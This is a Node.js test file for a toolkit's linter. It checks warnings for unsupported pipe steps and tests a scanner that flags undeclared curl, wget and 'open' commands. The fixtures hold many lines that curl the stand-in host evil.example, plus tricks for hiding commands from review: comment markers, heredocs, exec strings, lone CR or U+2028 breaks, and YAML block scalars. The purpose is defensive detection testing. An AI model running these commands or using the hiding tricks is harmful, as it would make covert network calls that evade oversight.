// Run: node --test toolkit/test/lint-honesty.test.mjs
// 1. A transform step the runtime recognizes but does not run yet is a warning (the app loads; the step fails when it runs).
// 2. The install-prompt scan does not fire on comments or on description text, and still fires on a real command.
import test from 'node:test';
import assert from 'node:assert/strict';
import { spawnSync } from 'node:child_process';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import { fileURLToPath } from 'node:url';
import { assessYaml, scanMentions } from '../lib/assess.mjs';

const HERE = path.dirname(fileURLToPath(import.meta.url));
const CLI = path.resolve(HERE, '../bin/bolt-apps.mjs');
const run = (cwd, ...a) => spawnSync(process.execPath, [CLI, ...a], { cwd, encoding: 'utf8' });
const tmp = () => fs.mkdtempSync(path.join(os.tmpdir(), 'bolt-lint-'));
const RESERVED = ['yaml', 'toml', 'env', 'properties', 'camel', 'snake', 'kebab', 'slug', 'flatten', 'rename_cols', 'redact_secrets'];

const app = (pipe, extra = '') => `schema_version: 1\nruntime: transform\nid: demo\nchip: demo\ntitle: "Demo"\nicon: globe\ndescription: Demo\nemits: Generic\npresentation:\n  widget: detail\ntransform:\n  pipe:\n${pipe}\n${extra}`;
const reserved = (y) => assessYaml(y, 'demo', {}).problems.filter((p) => p.code === 'pipe_step_not_supported');

test('a reserved pipe step is warned about by name, in the plain words the runtime uses', () => {
	for (const name of RESERVED) {
		const y = app(`    - trim\n    - ${name}`);
		const p = reserved(y); assert.equal(p.length, 1, name);
		assert.equal(p[0].level, 'warning', name);
		assert.match(p[0].message, new RegExp(`'${name}'`)); assert.match(p[0].message, /recognized but not yet supported/);
		assert.match(p[0].message, /step 2/);
	}
	const obj = reserved(app('    - { rename_cols: { a: b } }'));
	assert.equal(obj.length, 1); assert.match(obj[0].message, /'rename_cols'/);
});

test('supported steps and look-alike words do not warn', () => {
	assert.deepEqual(reserved(app('    - trim\n    - upper\n    - { replace: { from: a, to: b } }\n    - sanitize')), []);
	assert.deepEqual(reserved(app('    - trim', 'description2: "camel snake yaml"')), []);
	// a step named only in a comment or a description is not a step
	assert.deepEqual(reserved(app('    - trim\n    # - slug').replace('description: Demo', 'description: "use slug or yaml here"')), []);
});

test('lint (gallery app) and verify (its pack) both warn and exit 0', () => {
	const d = tmp(); assert.equal(run(d, 'new', 'demo-app', '--type', 'transform').status, 0);
	const f = path.join(d, 'apps/demo-app/utilities/demo-app.yaml');
	fs.writeFileSync(f, fs.readFileSync(f, 'utf8').replace('    - upper', '    - upper\n    - redact_secrets'));
	const l = run(d, 'lint', 'apps/demo-app', '--json'); assert.equal(l.status, 0, l.stdout + l.stderr);
	assert.ok(JSON.parse(l.stdout).reports[0].findings.some((x) => x.code === 'pipe_step_not_supported' && x.level === 'warning' && /redact_secrets/.test(x.message)), l.stdout);
	const key = path.join(d, 'k.pem'), out = path.join(d, 'x.boltpack');
	assert.equal(run(d, 'keygen', '--out', key).status, 0);
	assert.equal(run(d, 'pack', 'apps/demo-app', '--key', key, '--out', out).status, 0);
	const v = run(d, 'verify', out, '--json'); assert.equal(v.status, 0, v.stdout + v.stderr);
	assert.ok(JSON.parse(v.stdout).findings.some((x) => x.code === 'pipe_step_not_supported' && x.level === 'warning'), v.stdout);
});

const f = (name, text) => [{ name, text }];            // a file the scan treats as a script
const fa = (name, text) => [{ name, text, app: true }]; // an app file (utilities/*.yaml): the only kind whose description text is skipped
const OPEN = 'open (starts other programs or documents) (in ';
const CURL = 'curl or wget to evil.example, which it does not declare (in ';
test('scan: one-line description text does not trigger open or curl, a real command still does', () => {
	// known remaining false positive: a comment line in a script or a YAML # comment is still scanned (a line filter cannot skip it safely)
	assert.deepEqual(scanMentions(f('a.sh', '# open /var/log in your editor\n')), [`${OPEN}a.sh)`]);
	assert.deepEqual(scanMentions(f('a.py', '  # open "/tmp/x" to see it\n')), [`${OPEN}a.py)`]);
	assert.deepEqual(scanMentions(fa('app.yaml', 'description: "Wraps curl so you can fetch pages"\n')), []);
	assert.deepEqual(scanMentions(fa('app.yaml', 'description: "open /var/log in your editor"\n')), []);
	assert.deepEqual(scanMentions(fa('app.yaml', 'placeholder_examples: ["curl it"]\ndescription: Wraps wget\n')), []);
	// true positives stay
	assert.deepEqual(scanMentions(f('a.sh', '# note\nopen /tmp/x\n')), ['open (starts other programs or documents) (in a.sh)']);
	assert.deepEqual(scanMentions(f('a.sh', '# note\ncurl https://api.example.com/x\n')), ['curl or wget to api.example.com, which it does not declare (in a.sh)']);
	assert.deepEqual(scanMentions(fa('app.yaml', 'bridge:\n  command:\n    macos: "curl https://api.example.com/x"\n')), ['curl or wget to api.example.com, which it does not declare (in app.yaml)']);
	assert.deepEqual(scanMentions(fa('app.yaml', 'description: Demo\ncommand: "open /tmp/x"\n')), ['open (starts other programs or documents) (in app.yaml)']);
});

// Hiding a command inside something that looks like prose or a comment must not work.
test('scan: a description line inside a block scalar or multi-line quote does not hide a command', () => {
	assert.deepEqual(scanMentions(fa('app.yaml', 'run: |\n  description: x; open /Applications/Foo.app\n')), [`${OPEN}app.yaml)`]);
	assert.deepEqual(scanMentions(fa('app.yaml', 'run: |\n  description: ; curl https://evil.example/x\n')), [`${CURL}app.yaml)`]);
	assert.deepEqual(scanMentions(fa('app.yaml', 'title: "one\ndescription: ; curl https://evil.example/x"\n')), [`${CURL}app.yaml)`]);
	assert.deepEqual(scanMentions(fa('app.yaml', 'description: |\n  open /tmp/x\n')), [`${OPEN}app.yaml)`]);
	assert.deepEqual(scanMentions(fa('app.yaml', 'description: "unclosed\n  ; open /tmp/x"\n')), [`${OPEN}app.yaml)`]);
	assert.deepEqual(scanMentions(fa('app.yaml', '  description: "indented, so not the top-level key; open /tmp/x"\n')), [`${OPEN}app.yaml)`]);
});
test('scan: no comment skipping in scripts: a command after a comment marker, in a string, heredoc or continuation, is still found', () => {
	const hit = (n, t) => assert.deepEqual(scanMentions(f(n, t)), [`${CURL}${n})`], t);
	hit('a.sh', '//usr/bin/curl https://evil.example/x\n');
	hit('a.sh', '#curl https://evil.example/x\n');
	hit('a.sh', '// x; curl https://evil.example/x\n');
	hit('a.sh', 'sh <<EOF\n// x; curl https://evil.example/x\nEOF\n');
	hit('a.py', 'import os\nos.system("""\n# x; curl https://evil.example/x\n""")\n');
	hit('a.js', 'execSync(`\n// x; curl https://evil.example/x\n`)\n');
	hit('a.sh', '\u00a0# x; curl https://evil.example/x\n');
	hit('a.sh', '\ufeff# x; curl https://evil.example/x\n');
	hit('a.sh', 'echo a\\\n# x; curl https://evil.example/z\n');
});
test('scan: a lone CR or U+2028 ends a line in Python and JS, so what follows is still scanned', () => {
	assert.deepEqual(scanMentions(f('a.py', '# c\rimport os;os.system("curl https://evil.example/x")\n')), [`${CURL}a.py)`]);
	assert.deepEqual(scanMentions(f('a.js', '// c\rexec("curl https://evil.example/x")\n')), [`${CURL}a.js)`]);
	assert.deepEqual(scanMentions(f('a.js', '// c\u2028exec("curl https://evil.example/x")\n')), [`${CURL}a.js)`]);
});
test('scan: CRLF app file keeps skipping one-line description text and still finds commands', () => {
	assert.deepEqual(scanMentions(fa('app.yaml', 'description: "Wraps curl so you can fetch pages"\r\nid: x\r\n')), []);
	assert.deepEqual(scanMentions(f('a.sh', '# note\r\ncurl https://evil.example/x\r\n')), [`${CURL}a.sh)`]);
});
test('scan: the description skip applies to app files only, never to a script that happens to be named .yaml', () => {
	const body = 'description: x; curl https://evil.example/x\n';
	assert.deepEqual(scanMentions(f('demo__run.yaml', body)), [`${CURL}demo__run.yaml)`]);
	assert.deepEqual(scanMentions(f('demo__run.yml', 'placeholder_examples: [a]; open /tmp/x\n')), [`${OPEN}demo__run.yml)`]);
	assert.deepEqual(scanMentions([{ name: 'demo__run.yaml', text: body, app: false }]), [`${CURL}demo__run.yaml)`]);
	// the same text in an app file is prose only when the whole value is one line of text
	assert.deepEqual(scanMentions(fa('app.yaml', 'description: "Wraps curl so you can fetch pages"\n')), []);
	assert.deepEqual(scanMentions(fa('app.yaml', body)), []); // in the app file it is a description string, which Bolt never runs
});
